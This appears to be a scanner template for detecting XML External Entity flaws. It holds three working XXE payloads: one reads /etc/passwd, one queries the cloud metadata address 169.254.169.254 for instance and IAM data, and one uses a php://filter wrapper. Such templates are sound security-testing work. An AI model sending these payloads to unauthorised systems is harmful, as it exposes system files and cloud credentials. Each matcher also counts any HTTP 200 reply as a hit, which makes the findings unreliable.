id: http-xxe-detection
info:
  name: "XML External Entity (XXE) Detection"
  severity: "High"
  description: "Detects XXE vulnerabilities by injecting XML payloads with external entity declarations."
  compliance:
    owasp: "A05:2021"
    cwe: "CWE-611"
requests:
  - method: POST
    path: "/api/xml"
    body: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
    headers:
      Content-Type: "application/xml"
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "bin:.*:1:1:"
      - type: status
        part: status
        status:
          - 200
    matcher_condition: or

  - method: POST
    path: "/xml/parse"
    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
    headers:
      Content-Type: "application/xml"
    matchers:
      - type: regex
        part: body
        regex:
          - "ami-id"
          - "instance-id"
          - "iam/"
      - type: status
        part: status
        status:
          - 200
    matcher_condition: or

  - method: POST
    path: "/upload/xml"
    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'
    headers:
      Content-Type: "application/xml"
    matchers:
      - type: regex
        part: body
        regex:
          - "cm9vdA=="
          - "dXNlcg=="
          - "Ymlu"
      - type: status
        part: status
        status:
          - 200
    matcher_condition: or